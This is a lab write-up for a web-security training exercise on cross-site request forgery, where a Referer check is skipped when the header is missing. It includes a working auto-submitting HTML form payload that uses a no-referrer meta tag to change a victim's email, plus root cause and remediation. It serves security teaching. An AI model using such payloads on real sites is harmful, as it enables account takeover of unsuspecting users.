## Vulnerability Summary

The app's email change functionality is vulnerable to Cross-site Request Forgery (CSRF). It attempts to block CSRF attack by using the `Referer` header to verify that the request originated from the app's own domain, but only do so when that header is present in the request body. An attacker can simply omit this parameter entirely and skip the validation to perform requests using the victim's authenticated session.
## Reconnaissance

- After logging in with the provided credentials `wiener - peter`, observe that there is a header `Cookie: session=random-token`. 
- Try deleting this `Cookie` header, or changing the value of the parameter `session` inside it and sending the request will result in a `302 Found` HTTP Response, signifying a redirection. When we follow this redirection, we get a `200 OK` HTTP Response but **logged out** of our account. However, when the `Cookie` header with its previous correct `session` value is put back into the request, we are logged in again.
This confirms that the app solely relies on this `Cookie` header for session handling, using it to identify the user who has made the requests. 
- The request to changing our email address is, by default, `POST /my-account/change-email`, with, the existence of the `Cookie` header and the parameter `email`, with the value being the email address we are changing to. There is no CSRF token implemented. Try changing the `Referer` header to a random value like `Referer: https://example.com` results in a `400 Bad Request` HTTP Response that reads `"Invalid referer header"`.
- However, when we try to omit the `Referer` header completely from the request and send it, our email address gets changed too. This means that the server skips the validation process of the `Referer` header if itself is not present. We can omit this header in our payload with the `meta` tag.
## Exploitation Steps

Notes: 
- `<meta name="referrer" content="never"/>` also works, but it's legacy. `content="no-referrer` is the modern HTML5 standard.
- It is more structurally correct to put the `<meta>`  tag inside the (in this lab, separated) `<head>`element of an HTML document.
That said, here are the steps:
1. Log in with the provided credentials (`wiener - peter`). Intercept the request to change your email address (`POST /my-account/change-email`). 
2. In Burp Suite Professional, right click on the request -> Engagement tools -> Generate CSRF PoC. **IMPORTANT**: you must change the value of the email address in this generated HTML. If not, you will still be using the email address you changed into in your account for the victim's account, which wouldn't work. The generated HTML should look something like this:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="uia&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
3. This payload is not finished though. As aforementioned, we have to omit the `Referer` header in the forged request. We can do so by adding this line: `<meta name="referrer" content="no-referrer" />`, which makes the complete payload this:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="uia&#64;gmail&#46;com" />
      <meta name="referrer" content="no-referrer" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
4.  Go on the lab's instance -> Go to exploit server. Copy the payload above into the **Body** of the crafted response. Store the payload, then deliver exploit to victim.
5. Lab is marked as solved. Observe that in the Access log (in the exploit server), the victim has visited the `/exploit` endpoint, which successfully triggered our payload.
## Payload Used

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="uia&#64;gmail&#46;com" />
      <meta name="referrer" content="no-referrer" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
The payload forces the authenticated victim's browser to execute a state changing action, which in this case is the email changing functionality at the `/my-account/change-email` endpoint. The input field is hidden to make the page appears as normal, `<input type="submit" value="Submit request" />` if the victim's browser has JavaScript disabled (not applicable in this case). We omit the `Referer` header using the `meta` tag with `content="no-referrer"` to bypass the app's validation mechanism. Finally, `history.pushState('', '', '/');` updates the browser's address bar to the root URL **without** triggering a page reload. This is to obscure the true source of exploit from the victim's view, then `document.forms[0].submit();` selects the first `<form>` element in the DOM and triggers its submission. 
## Root Cause

The app relies on the `Cookie` header as the sole mechanism to handle sessions and identify users. There is no other mechanism in place to validate user requests or track sessions. The anti-CSRF token is also not implemented. Although there is an attempt to prevent CSRF attacks by using the `Referer` header to verify that the request originated from the app's own domain, simply omitting it can bypass the validation mechanism completely. 
## Remediation

- A CSRF token must be implemented and included as a hidden field in all state-changing HTML forms (POST, PUT, DELETE). The server must validate that the token in the incoming request matches the token tied to the user's session (stored server-side) before processing the action. If no token exist where it should be, the server must deny the request.
- For high-impact state changes (e.g., email updates, password resets, account deletion), require the user to re-enter their current password or provide secondary authentication (MFA).
